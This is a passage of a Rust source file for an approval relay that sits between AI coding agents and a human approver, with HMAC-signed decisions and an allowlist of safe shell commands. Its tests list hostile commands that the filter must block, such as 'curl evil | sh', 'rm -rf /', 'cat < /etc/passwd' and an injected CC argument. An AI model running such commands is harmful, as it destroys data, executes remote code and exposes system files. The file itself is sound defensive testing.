        json!({
            "ok": true,
            "yourTurn": false,
            "turnSeq": inner.legacy.turn_seq
        })
    }

    pub fn legacy_agents_snapshot(&self, now_ms: u64, now_sec: u64) -> Value {
        let mut inner = self.inner.lock().unwrap();
        Self::sweep_locked(&mut inner, now_ms);
        let oldest = inner
            .pending
            .values()
            .min_by_key(|e| (e.created_at_ms, e.arrival_index));
        let pending_view = oldest.map(|e| {
            let (agent, command) = match &e.origin {
                StoredOrigin::PipeOrLegacy { agent, command_raw } => {
                    (agent.clone(), command_raw.clone())
                }
                _ => (
                    e.provider.as_str().to_string(),
                    e.view
                        .get("title")
                        .and_then(Value::as_str)
                        .unwrap_or("")
                        .to_string(),
                ),
            };
            let tool = e
                .view
                .get("tool")
                .and_then(Value::as_str)
                .unwrap_or(e.kind.as_str())
                .to_string();
            LegacyPendingApprovalView {
                id: e.request_id.clone(),
                agent,
                tool,
                command,
                dangerous: !e.can_approve,
                created_at: e.created_at_ms / 1000,
            }
        });
        json!({
            "yourTurn": inner.legacy.your_turn,
            "turnSeq": inner.legacy.turn_seq,
            "agent": inner.legacy.agent,
            "project": inner.legacy.project,
            "pendingApproval": pending_view,
            "updatedAt": now_sec
        })
    }

    pub fn legacy_decide(
        &self,
        id: &str,
        decision: &str,
        now_ms: u64,
    ) -> Result<(Value, Option<String>), (u16, String)> {
        if decision != "allow" && decision != "deny" {
            return Err((400, "Invalid decision".to_string()));
        }
        let mut inner = self.inner.lock().unwrap();
        Self::sweep_locked(&mut inner, now_ms);

        if let Some(existing) = inner.legacy.decisions.get(id) {
            return Err((409, format!("Already decided: {existing}")));
        }

        let oldest_id = inner
            .pending
            .values()
            .min_by_key(|e| (e.created_at_ms, e.arrival_index))
            .map(|e| e.request_id.clone());

        if oldest_id.as_deref() != Some(id) {
            if inner.pending.contains_key(id) || inner.legacy.approval_times.contains_key(id) {
                return Err((409, "Approval already consumed or expired".to_string()));
            }
            return Err((409, "Approval not found".to_string()));
        }

        let mut removed = inner.pending.remove(id).unwrap();
        inner
            .legacy
            .decisions
            .insert(id.to_string(), decision.to_string());
        inner.legacy.approval_times.remove(id);
        let pipe_id = removed.pipe_request_id.take();
        let verdict = if decision == "allow" {
            Verdict::Approve
        } else {
            Verdict::Deny
        };
        if let Some(tx) = removed.waiter.take() {
            let _ = tx.send(Some(verdict));
        }
        Ok((
            json!({
                "ok": true,
                "id": id,
                "decision": decision
            }),
            pipe_id,
        ))
    }

    pub fn legacy_get_decision(&self, id: &str, now_ms: u64) -> Value {
        let mut inner = self.inner.lock().unwrap();
        Self::sweep_locked(&mut inner, now_ms);
        let status = if let Some(d) = inner.legacy.decisions.get(id) {
            d.clone()
        } else if inner.pending.contains_key(id) {
            "pending".to_string()
        } else {
            "expired".to_string()
        };
        json!({
            "id": id,
            "decision": status,
            "status": status
        })
    }
}

// -----------------------------------------------------------------------------
// Formatação de resposta dos hooks (Claude Code e Codex)
// -----------------------------------------------------------------------------

pub fn build_claude_question_hook_response(verdict: Verdict, event: &Value) -> Option<Value> {
    match verdict {
        Verdict::Terminal => None,
        Verdict::Deny => Some(json!({
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason": "Denied from VibePulse"
            }
        })),
        Verdict::Approve => {
            let tool_input = event.get("tool_input")?;
            let q = first_claude_question(tool_input)?;
            let rec_idx = q
                .options
                .iter()
                .position(|o| has_recommended_suffix(o.label))?;
            let rec_count = q
                .options
                .iter()
                .filter(|o| has_recommended_suffix(o.label))
                .count();
            if rec_count != 1 {
                return None;
            }
            let chosen_label = q.options[rec_idx].label;
            let mut answers = Map::new();
            answers.insert(q.question.to_string(), Value::String(chosen_label.to_string()));
            Some(json!({
                "hookSpecificOutput": {
                    "hookEventName": "PreToolUse",
                    "permissionDecision": "allow",
                    "updatedInput": {
                        "questions": tool_input.get("questions")?.clone(),
                        "answers": answers
                    }
                }
            }))
        }
    }
}

pub fn build_permission_hook_response(verdict: Verdict) -> Option<Value> {
    match verdict {
        Verdict::Terminal => None,
        Verdict::Approve => Some(json!({
            "hookSpecificOutput": {
                "hookEventName": "PermissionRequest",
                "decision": { "behavior": "allow" }
            }
        })),
        Verdict::Deny => Some(json!({
            "hookSpecificOutput": {
                "hookEventName": "PermissionRequest",
                "decision": {
                    "behavior": "deny",
                    "message": "Denied from VibePulse"
                }
            }
        })),
    }
}

pub fn build_codex_question_response(
    verdict: Verdict,
    event: &Value,
) -> Value {
    if verdict != Verdict::Approve {
        return json!({
            "status": "computer",
            "reason": verdict.as_str()
        });
    }
    let Some(options) = event.get("options").and_then(Value::as_array) else {
        return json!({ "status": "computer", "reason": "invalid" });
    };
    let rec: Vec<(usize, &str)> = options
        .iter()
        .enumerate()
        .filter_map(|(i, o)| {
            if o.get("recommended").and_then(Value::as_bool) == Some(true) {
                o.get("label").and_then(Value::as_str).map(|l| (i, l))
            } else {
                None
            }
        })
        .collect();
    if rec.len() != 1 {
        return json!({ "status": "computer", "reason": "approve" });
    }
    let (idx, label) = rec[0];
    json!({
        "status": "answered",
        "option_index": idx,
        "answer": label
    })
}

// -----------------------------------------------------------------------------
// Canonicidade de view_sha256 e HMAC v2 / Pânico
// -----------------------------------------------------------------------------

fn canonical_view_bytes_from_map(map: &BTreeMap<String, Value>) -> Vec<u8> {
    let mut filtered = Map::new();
    for (k, v) in map {
        if k == "expires_in_ms" || k == "view_sha256" || v.is_null() {
            continue;
        }
        filtered.insert(k.clone(), canonicalize_value(v));
    }
    serde_json::to_vec(&Value::Object(filtered)).unwrap_or_default()
}

fn canonicalize_value(v: &Value) -> Value {
    match v {
        Value::Object(obj) => {
            let mut sorted = Map::new();
            let mut keys: Vec<&String> = obj.keys().collect();
            keys.sort();
            for k in keys {
                sorted.insert(k.clone(), canonicalize_value(&obj[k]));
            }
            Value::Object(sorted)
        }
        Value::Array(arr) => Value::Array(arr.iter().map(canonicalize_value).collect()),
        other => other.clone(),
    }
}

pub fn view_bytes(view: &Value) -> Option<Vec<u8>> {
    let obj = view.as_object()?;
    let mut map = BTreeMap::new();
    for (k, v) in obj {
        map.insert(k.clone(), v.clone());
    }
    Some(canonical_view_bytes_from_map(&map))
}

pub fn view_digest(view: &Value) -> Option<String> {
    let bytes = view_bytes(view)?;
    Some(sha256_hex_bytes(&bytes))
}

pub fn sha256_hex_bytes(bytes: &[u8]) -> String {
    let d = digest(&SHA256, bytes);
    let mut out = String::with_capacity(64);
    for b in d.as_ref() {
        use std::fmt::Write as _;
        let _ = write!(&mut out, "{b:02x}");
    }
    out
}

fn hmac_sha256_hex(secret_text: &str, msg: &str) -> String {
    let key = hmac::Key::new(hmac::HMAC_SHA256, secret_text.as_bytes());
    let tag = hmac::sign(&key, msg.as_bytes());
    let mut out = String::with_capacity(64);
    for b in tag.as_ref() {
        use std::fmt::Write as _;
        let _ = write!(&mut out, "{b:02x}");
    }
    out
}

pub fn is_sha256_hex(raw: &str) -> bool {
    raw.len() == 64 && raw.bytes().all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
}

pub fn is_fresh_timestamp(ts: i64, now_sec: u64) -> bool {
    if ts < 0 {
        return false;
    }
    let now = now_sec as i64;
    (now - ts).abs() <= FRESHNESS_SECS
}

pub fn sign_answer_v2(
    secret: &str,
    provider: &str,
    request_id: &str,
    view_sha256: &str,
    verdict: &str,
    ts: i64,
) -> Option<String> {
    if secret.is_empty()
        || InteractionProvider::parse(provider).is_none()
        || request_id.is_empty()
        || !is_sha256_hex(view_sha256)
        || Verdict::parse(verdict).is_none()
        || ts < 0
    {
        return None;
    }
    let msg = format!("v2|{provider}|{request_id}|{view_sha256}|{verdict}|{ts}");
    Some(hmac_sha256_hex(secret, &msg))
}

#[allow(clippy::too_many_arguments)]
pub fn verify_answer_v2(
    secret: &str,
    provider: &str,
    request_id: &str,
    view_sha256: &str,
    verdict: &str,
    ts: i64,
    mac: &str,
    now_sec: u64,
) -> bool {
    if !is_sha256_hex(mac) || !is_fresh_timestamp(ts, now_sec) {
        return false;
    }
    let Some(expected) = sign_answer_v2(secret, provider, request_id, view_sha256, verdict, ts)
    else {
        return false;
    };
    constant_time_str_eq(&expected, mac)
}

pub fn sign_panic(secret: &str, ts: i64) -> Option<String> {
    if secret.is_empty() || ts < 0 {
        return None;
    }
    let msg = format!("panic|deny|{ts}");
    Some(hmac_sha256_hex(secret, &msg))
}

pub fn verify_panic(secret: &str, ts: i64, mac: &str, now_sec: u64) -> bool {
    if !is_sha256_hex(mac) || !is_fresh_timestamp(ts, now_sec) {
        return false;
    }
    let Some(expected) = sign_panic(secret, ts) else {
        return false;
    };
    constant_time_str_eq(&expected, mac)
}

// -----------------------------------------------------------------------------
// Validação de texto, perguntas e faixa segura de comandos
// -----------------------------------------------------------------------------

fn is_control_or_format(c: char) -> bool {
    c.is_control()
        || matches!(
            c,
            '\u{200B}'..='\u{200F}'
                | '\u{202A}'..='\u{202E}'
                | '\u{2060}'..='\u{206F}'
                | '\u{FEFF}'
                | '\u{00AD}'
                | '\u{061C}'
                | '\u{180E}'
        )
}

pub fn is_safe_text(value: &str) -> bool {
    !value.chars().any(is_control_or_format)
}

fn text_is_valid(value: &str, max_bytes: Option<usize>) -> bool {
    if value.trim().is_empty() || !is_safe_text(value) {
        return false;
    }
    max_bytes.is_none_or(|cap| value.len() <= cap)
}

pub fn clean_text(raw: &str, limit_bytes: usize) -> Option<(String, bool)> {
    let collapsed = raw.split_whitespace().collect::<Vec<_>>().join(" ");
    if collapsed.is_empty() {
        return None;
    }
    if collapsed.len() <= limit_bytes {
        return Some((collapsed, false));
    }
    let suffix = "…";
    let budget = limit_bytes.saturating_sub(suffix.len());
    let mut out = String::new();
    let mut used = 0usize;
    for ch in collapsed.chars() {
        let len = ch.len_utf8();
        if used + len > budget {
            break;
        }
        out.push(ch);
        used += len;
    }
    let trimmed = out.trim_end().to_string();
    let final_str = format!("{trimmed}{suffix}");
    if final_str.len() > limit_bytes {
        return None;
    }
    Some((final_str, true))
}

fn has_recommended_suffix(label: &str) -> bool {
    label
        .trim()
        .to_ascii_lowercase()
        .ends_with(RECOMMENDED_SUFFIX)
}

pub fn strip_recommended(label: &str) -> String {
    let trimmed = label.trim();
    if trimmed.to_ascii_lowercase().ends_with(RECOMMENDED_SUFFIX) {
        let cut = trimmed.len() - RECOMMENDED_SUFFIX.len();
        trimmed[..cut].trim().to_string()
    } else {
        trimmed.to_string()
    }
}

struct ClaudeOption<'a> {
    label: &'a str,
    description: Option<&'a str>,
}

struct ClaudeQuestion<'a> {
    question: &'a str,
    header: Option<&'a str>,
    options: Vec<ClaudeOption<'a>>,
}

fn first_claude_question(tool_input: &Value) -> Option<ClaudeQuestion<'_>> {
    let obj = tool_input.as_object()?;
    let questions = obj.get("questions")?.as_array()?;
    if questions.len() != 1 {
        return None;
    }
    let q = questions[0].as_object()?;
    if q.get("multiSelect").and_then(Value::as_bool) == Some(true) {
        return None;
    }
    let question = q.get("question")?.as_str()?;
    let header = q.get("header").and_then(Value::as_str);
    let raw_opts = q.get("options")?.as_array()?;
    if !(1..=255).contains(&raw_opts.len()) {
        return None;
    }
    let mut options = Vec::with_capacity(raw_opts.len());
    for item in raw_opts {
        let item_obj = item.as_object()?;
        let label = item_obj.get("label")?.as_str()?;
        let description = item_obj.get("description").and_then(Value::as_str);
        options.push(ClaudeOption { label, description });
    }
    Some(ClaudeQuestion {
        question,
        header,
        options,
    })
}

fn is_shell_tool(tool_name: &str) -> bool {
    matches!(
        tool_name.trim().to_ascii_lowercase().as_str(),
        "bash" | "shell" | "exec" | "exec_command"
    )
}

pub fn can_approve_permission(tool_name: &str, command: Option<&str>, readable: bool) -> bool {
    if !readable {
        return false;
    }
    let lower = tool_name.trim().to_ascii_lowercase();
    if APPROVABLE_READ_TOOLS.contains(&lower.as_str()) {
        return true;
    }
    if !is_shell_tool(&lower) {
        return false;
    }
    let Some(cmd) = command else {
        return false;
    };
    codex_shell_command_is_safe(cmd)
}

fn has_command_chaining(command: &str) -> bool {
    command
        .chars()
        .any(|c| matches!(c, ';' | '&' | '|' | '>' | '<' | '`' | '$' | '\n' | '\r'))
}

fn shell_split(command: &str) -> Option<Vec<String>> {
    let mut args = Vec::new();
    let mut current = String::new();
    let mut in_token = false;
    let mut quote: Option<char> = None;
    let mut chars = command.chars().peekable();

    while let Some(c) = chars.next() {
        match quote {
            Some('\'') => {
                if c == '\'' {
                    quote = None;
                } else {
                    current.push(c);
                }
            }
            Some('"') => {
                if c == '"' {
                    quote = None;
                } else if c == '\\' {
                    let next = chars.next()?;
                    current.push(next);
                } else {
                    current.push(c);
                }
            }
            None => {
                if c.is_whitespace() {
                    if in_token {
                        args.push(std::mem::take(&mut current));
                        in_token = false;
                    }
                } else if c == '\'' || c == '"' {
                    quote = Some(c);
                    in_token = true;
                } else if c == '\\' {
                    let next = chars.next()?;
                    current.push(next);
                    in_token = true;
                } else {
                    current.push(c);
                    in_token = true;
                }
            }
            Some(_) => return None,
        }
    }
    if quote.is_some() {
        return None;
    }
    if in_token {
        args.push(current);
    }
    Some(args)
}

fn plain_arguments(args: &[String]) -> bool {
    args.iter().all(|a| !a.starts_with('-'))
}

fn make_or_ninja_is_safe(args: &[String]) -> bool {
    args.iter()
        .all(|a| SAFE_BUILD_TARGETS.contains(&a.to_ascii_lowercase().as_str()))
}

fn cmake_build_is_safe(args: &[String]) -> bool {
    if args.len() < 2
        || args[0].to_ascii_lowercase() != "--build"
        || args[1].starts_with('-')
    {
        return false;
    }
    let mut i = 2;
    while i < args.len() {
        let lower = args[i].to_ascii_lowercase();
        if lower == "--verbose" {
            i += 1;
        } else if lower == "--parallel" || lower == "-j" {
            i += 1;
            if i < args.len() && !args[i].starts_with('-') {
                if !args[i].chars().all(|c| c.is_ascii_digit()) {
                    return false;
                }
                i += 1;
            }
        } else if lower == "--config" {
            i += 1;
            if i >= args.len() || args[i].starts_with('-') {
                return false;
            }
            i += 1;
        } else if lower == "--target" {
            i += 1;
            let mut targets = 0usize;
            while i < args.len() && !args[i].starts_with('-') {
                if !SAFE_BUILD_TARGETS.contains(&args[i].to_ascii_lowercase().as_str()) {
                    return false;
                }
                targets += 1;
                i += 1;
            }
            if targets == 0 {
                return false;
            }
        } else if let Some(target_val) = lower.strip_prefix("--target=") {
            if !SAFE_BUILD_TARGETS.contains(&target_val) {
                return false;
            }
            i += 1;
        } else {
            return false;
        }
    }
    true
}

fn npm_is_safe(args: &[String]) -> bool {
    if args.is_empty() {
        return false;
    }
    let flags = if args[0].eq_ignore_ascii_case("test") {
        &args[1..]
    } else if args.len() >= 2
        && args[0].eq_ignore_ascii_case("run")
        && (args[1].eq_ignore_ascii_case("test") || args[1].eq_ignore_ascii_case("build"))
    {
        &args[2..]
    } else {
        return false;
    };
    flags
        .iter()
        .all(|f| SAFE_NPM_FLAGS.contains(&f.to_ascii_lowercase().as_str()))
}

fn git_is_safe(args: &[String]) -> bool {
    if args.is_empty() {
        return false;
    }
    let sub = args[0].to_ascii_lowercase();
    let tail = &args[1..];
    match sub.as_str() {
        "status" => tail
            .iter()
            .all(|f| SAFE_GIT_STATUS_FLAGS.contains(&f.to_ascii_lowercase().as_str())),
        "branch" => tail.is_empty() || (tail.len() == 1 && tail[0] == "--show-current"),
        "log" | "show" => tail.iter().all(|a| {
            !a.starts_with('-') || SAFE_GIT_LOG_SHOW_FLAGS.contains(&a.to_ascii_lowercase().as_str())
        }),
        "diff" => {
            let mut paths_only = false;
            for a in tail {
                if paths_only {
                    continue;
                }
                if a == "--" {
                    paths_only = true;
                } else if a.starts_with('-')
                    && !SAFE_GIT_DIFF_FLAGS.contains(&a.to_ascii_lowercase().as_str())
                {
                    return false;
                }
            }
            true
        }
        _ => false,
    }
}

pub fn codex_shell_command_is_safe(command: &str) -> bool {
    if command.trim().is_empty() || has_command_chaining(command) {
        return false;
    }
    let Some(tokens) = shell_split(command) else {
        return false;
    };
    if tokens.is_empty() {
        return false;
    }
    if tokens[0] == "./test/run.sh" {
        return tokens.len() == 1;
    }
    let family = tokens[0].to_ascii_lowercase();
    let args = &tokens[1..];
    match family.as_str() {
        "make" | "ninja" => make_or_ninja_is_safe(args),
        "cmake" => cmake_build_is_safe(args),
        "npm" => npm_is_safe(args),
        "git" => git_is_safe(args),
        "ls" | "cat" | "head" | "tail" | "wc" | "grep" | "rg" => plain_arguments(args),
        "pytest" | "ctest" => plain_arguments(args),
        "python" | "python3" => {
            args.len() >= 2 && args[0] == "-m" && args[1] == "unittest" && plain_arguments(&args[2..])
        }
        "cargo" => {
            !args.is_empty()
                && (args[0].eq_ignore_ascii_case("test") || args[0].eq_ignore_ascii_case("build"))
                && plain_arguments(&args[1..])
        }
        "go" => !args.is_empty() && args[0].eq_ignore_ascii_case("test") && plain_arguments(&args[1..]),
        "idf.py" => args.len() == 1 && args[0].eq_ignore_ascii_case("build"),
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const TEST_KEY: &str = "sala-teste-0123456789abcdef";

    fn claude_question_event(question: &str, options: Value) -> Value {
        json!({
            "session_id": "sess-1",
            "cwd": "C:\\Users\\dev\\lumen",
            "hook_event_name": "PreToolUse",
            "tool_name": "AskUserQuestion",
            "tool_input": {
                "questions": [{
                    "question": question,
                    "header": "Auth",
                    "multiSelect": false,
                    "options": options
                }]
            }
        })
    }

    fn claude_permission_event(tool: &str, command: &str, description: &str) -> Value {
        json!({
            "session_id": "sess-1",
            "cwd": "/home/dev/lumen",
            "hook_event_name": "PermissionRequest",
            "tool_name": tool,
            "tool_input": {
                "command": command,
                "description": description
            }
        })
    }

    fn codex_question_payload(options: Value) -> Value {
        json!({
            "cwd": "/repo/lumen",
            "session_id": "codex-s1",
            "turn_id": "turn-1",
            "question": "How should Codex handle approvals?",
            "header": "Approvals",
            "options": options
        })
    }

    fn codex_permission_event(tool: &str, command: &str) -> Value {
        json!({
            "hook_event_name": "PermissionRequest",
            "session_id": "codex-s1",
            "turn_id": "turn-1",
            "cwd": "/repo/lumen",
            "tool_name": tool,
            "tool_input": {
                "command": command,
                "description": "Run local check"
            }
        })
    }

    #[test]
    fn fixed_hmac_and_view_sha256_vectors_match_board_and_vibepulse() {
        // Vetor fixo da placa (mqtt_link_testar_hmac_pedido) e do enunciado L11.2
        let digest = view_digest(&json!({ "kind": "question" })).unwrap();
        assert_eq!(
            digest,
            "4fbdd5c99cef1cade65275db18604ee0d507b553fb36449836bb41c023d46c5b"
        );
        let mac = sign_answer_v2(
            TEST_KEY,
            "claude",
            "0123456789abcdef0123456789abcdef",
            &digest,
            "approve",
            1_800_000_000,
        )
        .unwrap();
        assert_eq!(
            mac,
            "96d4e9778cb63332edea0d9501beb0217d57680eed346d270cd31856d18fe0b5"
        );
        assert!(verify_answer_v2(
            TEST_KEY,
            "claude",
            "0123456789abcdef0123456789abcdef",
            &digest,
            "approve",
            1_800_000_000,
            &mac,
            1_800_000_000
        ));

        let panic_mac = sign_panic(TEST_KEY, 1_800_000_000).unwrap();
        assert_eq!(
            panic_mac,
            "238d10d1c0aa7760b690d1b5bb4de4fae910779f583465aaa8fa82886bbd43c6"
        );
        assert!(verify_panic(TEST_KEY, 1_800_000_000, &panic_mac, 1_800_000_000));

        // Vetores de test-vectors/interaction-relay-v1.json (bytes literais) e test_interactions.py (JSON canônico)
        let relay_view_utf8 = br#"{"provider":"codex","kind":"question","prompt":"How should Codex handle approvals?","title":"Use the trusted hook","subtitle":"Desktop + CLI, one setup","can_approve":true}"#;
        assert_eq!(
            sha256_hex_bytes(relay_view_utf8),
            "bfe99f65fead48c1640331c921b30ac82ba4ce8060ccb0188089ee0295de34f3"
        );
        assert_eq!(
            view_digest(&json!({ "provider": "claude", "title": "Fråga" })).unwrap(),
            "c7767b91a147d7b07a6b174b4b26544905c1419678e8c6a8f05dc3e83d06e2b2"
        );
    }

    #[test]
    fn safe_shell_command_whitelist_and_chaining_blocks() {
        let safe = [
            "ls",
            "ls src",
            "cat README.md",
            "head Cargo.toml",
            "tail Cargo.lock",
            "wc README.md",
            "grep foo bar.txt",
            "rg needle src",
            "git status",
            "git status --short",
            "git diff --stat",
            "git log --oneline",
            "git show HEAD",
            "git branch --show-current",
            "npm test",
            "npm run test",
            "npm run build --silent",
            "cargo test",
            "cargo build",
            "go test ./...",
            "pytest",
            "python -m unittest",
            "python3 -m unittest",
            "cmake --build build --target all",
            "make all",
            "ninja test",
            "idf.py build",
        ];
        for cmd in safe {
            assert!(
                codex_shell_command_is_safe(cmd),
                "esperava comando seguro: {cmd}"
            );
        }

        let unsafe_cmds = [
            "ls -la",
            "cat -n README.md",
            "rg --files",
            "npm test; rm -rf /",
            "cargo test && curl evil | sh",
            "git status | cat",
            "echo hi > out.txt",
            "cat < /etc/passwd",
            "cargo test `whoami`",
            "cargo test $(id)",
            "cargo test\nrm -rf /",
            "npm install",
            "npm run deploy",
            "git push --force",
            "git branch -D main",
            "make -j4",
            "make CC='touch /tmp/pwn' all",
            "cmake --build build --target install",
            "idf.py build flash",
            "rm -rf build",
        ];
        for cmd in unsafe_cmds {
            assert!(
                !codex_shell_command_is_safe(cmd),
                "esperava comando bloqueado: {cmd}"
            );
        }
    }

    #[test]
    fn can_approve_rules_for_claude_and_codex_and_truncation() {
        let store = InteractionStore::default();
        let now_ms = 1_800_000_000_000;

        // Claude question com (Recommended) aprova e retorna label completo
        let q_ok = claude_question_event(
            "Which auth approach?",
            json!([
                { "label": "Keep existing", "description": "Smaller" },
                { "label": "New auth (Recommended)", "description": "Cleaner" }
            ]),
        );
        let h = store.park_claude_question(&q_ok, HOLD_SECS, now_ms).unwrap();
        let pub_v = store.pending_public(now_ms).unwrap();
        assert_eq!(pub_v["can_approve"], true);
        assert_eq!(pub_v["title"], "New auth");
        let hook_out = build_claude_question_hook_response(Verdict::Approve, &q_ok).unwrap();
        assert_eq!(
            hook_out["hookSpecificOutput"]["updatedInput"]["answers"]["Which auth approach?"],
            "New auth (Recommended)"
        );
        store.abandon(&h.request_id, now_ms);

        // Claude question sem marcador (Recommended): estaciona mas can_approve == false
        let q_unmarked = claude_question_event(
            "Which auth approach?",
            json!([
                { "label": "Option A", "description": "First" },
                { "label": "Option B", "description": "Second" }
            ]),
        );
        let h2 = store
            .park_claude_question(&q_unmarked, HOLD_SECS, now_ms)
            .unwrap();
        let pub_v2 = store.pending_public(now_ms).unwrap();
        assert_eq!(pub_v2["can_approve"], false);
        assert_eq!(pub_v2["marked"], false);
        store.abandon(&h2.request_id, now_ms);

        // Claude question com texto cortado (>96 bytes): can_approve == false
        let long_q = format!("Escolha {}", "x".repeat(120));
        let q_trunc = claude_question_event(
            &long_q,
            json!([{ "label": "Sim (Recommended)", "description": "Ok" }]),
        );
        let h3 = store
            .park_claude_question(&q_trunc, HOLD_SECS, now_ms)
            .unwrap();
        let pub_v3 = store.pending_public(now_ms).unwrap();
        assert_eq!(pub_v3["can_approve"], false);
        assert!(pub_v3["prompt"].as_str().unwrap().len() <= PROMPT_MAX);
        store.abandon(&h3.request_id, now_ms);

        // Codex question: 2 opções, 1 recommended -> aprova; sem recommended -> não aprova; 2 recommended -> inválido
        let cx_ok = codex_question_payload(json!([
            { "label": "Keep", "recommended": false },
            { "label": "Use hook", "description": "Recommended choice", "recommended": true }
        ]));
        let h4 = store
            .park_codex_question(&cx_ok, HOLD_SECS, now_ms)
            .unwrap()
            .unwrap();
        assert_eq!(store.pending_public(now_ms).unwrap()["can_approve"], true);
        assert_eq!(
            build_codex_question_response(Verdict::Approve, &cx_ok),
            json!({ "status": "answered", "option_index": 1, "answer": "Use hook" })
        );
        store.abandon(&h4.request_id, now_ms);

        let cx_unmarked = codex_question_payload(json!([
            { "label": "Opt 1" },
            { "label": "Opt 2" }
        ]));
        let h5 = store
            .park_codex_question(&cx_unmarked, HOLD_SECS, now_ms)
            .unwrap()
            .unwrap();
        assert_eq!(store.pending_public(now_ms).unwrap()["can_approve"], false);
        store.abandon(&h5.request_id, now_ms);

        let cx_two_rec = codex_question_payload(json!([
            { "label": "Opt 1", "recommended": true },
            { "label": "Opt 2", "recommended": true }
        ]));
        assert!(store.park_codex_question(&cx_two_rec, HOLD_SECS, now_ms).is_err());

        // Permissão Codex perigosa vs segura
        let cx_unsafe = codex_permission_event("Shell", "rm -rf target");
        let h6 = store
            .park_codex_permission(&cx_unsafe, HOLD_SECS, now_ms)
            .unwrap();
        assert_eq!(store.pending_public(now_ms).unwrap()["can_approve"], false);
        store.abandon(&h6.request_id, now_ms);

        let cx_safe = codex_permission_event("Shell", "cargo test");
        let h7 = store
            .park_codex_permission(&cx_safe, HOLD_SECS, now_ms)
            .unwrap();
        assert_eq!(store.pending_public(now_ms).unwrap()["can_approve"], true);
        store.abandon(&h7.request_id, now_ms);
    }

    #[test]
    fn silence_never_approves_across_all_rejection_cases() {
        let store = InteractionStore::default();
        let now_sec = 1_800_000_000u64;
        let now_ms = now_sec * 1000;

        // 1. Vencido: expirar após 120s impede qualquer aprovação e envia None no waiter
        let ev = claude_permission_event("Bash", "cargo test", "Run tests");
        let mut h_exp = store.park_claude_permission(&ev, HOLD_SECS, now_ms).unwrap();
        let mac_exp = sign_answer_v2(
            TEST_KEY,
            "claude",
            &h_exp.request_id,
            &h_exp.view_sha256,
            "approve",
            now_sec as i64,
        )
        .unwrap();
        let after_120s = now_ms + (HOLD_SECS * 1000);
        let res_exp = store.resolve_http(
            TEST_KEY,
            &h_exp.request_id,
            "claude",
            &h_exp.view_sha256,
            "approve",
            now_sec as i64,
            &mac_exp,
            after_120s,
            now_sec + HOLD_SECS,
        );
        assert!(res_exp.is_err());
        assert_eq!(h_exp.rx.try_recv().ok().flatten(), None);

        // 2. Terminal: nunca aprova, hook recebe None (corpo vazio)
        let mut h_term = store
            .park_claude_permission(&ev, HOLD_SECS, now_ms)
            .unwrap();
        let mac_term = sign_answer_v2(
            TEST_KEY,
            "claude",
            &h_term.request_id,
            &h_term.view_sha256,
            "terminal",
            now_sec as i64,
        )
        .unwrap();
        let (out_term, _) = store
            .resolve_http(
                TEST_KEY,
                &h_term.request_id,
                "claude",
                &h_term.view_sha256,
                "terminal",
                now_sec as i64,
                &mac_term,
                now_ms,
                now_sec,
            )
            .unwrap();
        assert_eq!(out_term.verdict, Verdict::Terminal);
        assert_eq!(h_term.rx.try_recv().ok().flatten(), Some(Verdict::Terminal));
        assert!(build_permission_hook_response(Verdict::Terminal).is_none());

        // 3. HMAC errado, ts fora de ±90 s, view_sha256 diferente, can_approve=false -> todos recusados
        let h_live = store
            .park_claude_permission(&ev, HOLD_SECS, now_ms)
            .unwrap();
        let good_mac = sign_answer_v2(
            TEST_KEY,
            "claude",
            &h_live.request_id,
            &h_live.view_sha256,
            "approve",
            now_sec as i64,
        )
        .unwrap();

        // HMAC errado
        assert!(store
            .resolve_http(
                TEST_KEY,
                &h_live.request_id,
                "claude",
                &h_live.view_sha256,
                "approve",
                now_sec as i64,
                &"0".repeat(64),
                now_ms,
                now_sec,
            )
            .is_err());
        // ts fora de ±90 s (passado e futuro)
        let stale_ts = (now_sec as i64) - 91;
        let stale_mac = sign_answer_v2(
            TEST_KEY,
            "claude",
            &h_live.request_id,
            &h_live.view_sha256,
            "approve",
            stale_ts,
        )
        .unwrap();
        assert!(store
            .resolve_http(
                TEST_KEY,
                &h_live.request_id,
                "claude",
                &h_live.view_sha256,
                "approve",
                stale_ts,
                &stale_mac,
                now_ms,
                now_sec,
            )
            .is_err());
        let future_ts = (now_sec as i64) + 91;
        let future_mac = sign_answer_v2(
            TEST_KEY,
            "claude",
            &h_live.request_id,
            &h_live.view_sha256,
            "approve",
            future_ts,
        )
        .unwrap();
        assert!(store
            .resolve_http(
                TEST_KEY,
                &h_live.request_id,
                "claude",
                &h_live.view_sha256,
                "approve",
                future_ts,
                &future_mac,
                now_ms,
                now_sec,
            )
            .is_err());

        // view_sha256 diferente
        let other_digest = "f".repeat(64);
        let other_mac = sign_answer_v2(
            TEST_KEY,
            "claude",
            &h_live.request_id,
            &other_digest,
            "approve",
            now_sec as i64,
        )
        .unwrap();
        assert!(store
            .resolve_http(
                TEST_KEY,
                &h_live.request_id,
                "claude",
                &other_digest,
                "approve",
                now_sec as i64,
                &other_mac,
                now_ms,
                now_sec,
            )
            .is_err());

        // Primeiro uso aprova; reuso (replay) falha
        assert!(store
            .resolve_http(
                TEST_KEY,
                &h_live.request_id,
                "claude",
                &h_live.view_sha256,
                "approve",
                now_sec as i64,
                &good_mac,
                now_ms,
                now_sec,
            )
            .is_ok());
        assert!(store
            .resolve_http(
                TEST_KEY,
                &h_live.request_id,
                "claude",
                &h_live.view_sha256,
                "approve",
                now_sec as i64,
                &good_mac,
                now_ms,
                now_sec,
            )
            .is_err());
    }

    #[test]
    fn queue_limits_8_pending_and_oldest_first() {
        let store = InteractionStore::default();
        let ev = claude_permission_event("Bash", "cargo test", "Run");
        let mut ids = Vec::new();
        for i in 0..MAX_PENDING {
            let h = store
                .park_claude_permission(&ev, HOLD_SECS, 1_800_000_000_000 + (i as u64) * 10)
                .unwrap();
            ids.push(h.request_id);
        }
        assert!(store
            .park_claude_permission(&ev, HOLD_SECS, 1_800_000_001_000)
            .is_none());
        assert_eq!(
            store.pending_public(1_800_000_001_000).unwrap()["request_id"],
            ids[0]
        );
    }
}
